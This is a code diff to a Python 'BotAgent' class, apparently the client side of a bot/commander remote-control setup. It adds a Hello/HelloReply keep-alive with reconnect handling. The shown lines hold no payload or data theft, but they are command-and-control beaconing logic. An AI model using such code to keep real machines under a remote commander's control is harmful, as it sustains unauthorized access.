@@ -116,27 +116,55 @@ class BotAgent:
 
     def __check_for_commands(self):
         while True:
+            data = ""
             if time.time() - self.last_online > self.idle_tout:
                 # Send hello to commander so that it knows this bot-agent is still online
-                try:
-                    self.sock.sendall(b"Hello")
-                except Exception as err:
-                    print("Unexpected exception occurred for bot-agent {} when sending Hello to commander: {}".
-                          format(self.hostname, err))
-                    self.__tcp_handshake()
-            data = ""
+                if self.__keep_alive():
+                    continue
+                else:
+                    self.__self_identify()
             self.sock.settimeout(self.recv_tout)
             try:
                 data = self.sock.recv(self.conn_buff)
             except TimeoutError:
-                print("Bot-agent {} has timed out because no request was sent by commander".format(self.hostname))
-                self.__tcp_handshake()
+                print("Bot-agent {} has not received any request from commander in the past {} seconds. Still waiting".
+                      format(self.hostname, self.recv_tout))
             except Exception as err:
-                print("Timeout exceeded on bot-agent {} while waiting for data from commander, error: {}".
+                print("Unexpected error on bot-agent {} when reading input stream from commander, error: {}".
                       format(self.hostname, err))
-                self.__tcp_handshake()
             if data:
                 self.__process_command(data)
+
+    def __keep_alive(self):
+        try:
+            self.sock.sendall(b"Hello")
+        except Exception as err:
+            print("Unexpected exception occurred for bot-agent {} when sending Hello to commander: {}".
+                  format(self.hostname, err))
+            return False
+        try:
+            data = self.sock.recv(self.conn_buff)
+        except TimeoutError as err:
+            print("Timeout occurred for bot-agent {} when reading HelloReply from commander: {}. Reconnecting".
+                  format(self.hostname, err))
+            return False
+        if data:
+            try:
+                msg = data.decode("utf-8")
+                if msg == "HelloReply":
+                    self.last_online = time.time()
+                    return True
+                else:
+                    print("Unexpected message content received by bot-agent {} from commander".
+                          format(self.hostname))
+                    return False
+            except Exception as err:
+                print("Unexpected error while decoding reply from commander for Hello sent by bot-agent {}: {}"
+                      .format(self.hostname, err))
+                return False
+        else:
+            print("Received EOF by bot-agent {} from commander. Reconnecting".format(self.hostname))
+            return False
 
     def __identify_command(self, data):
         payload = ""
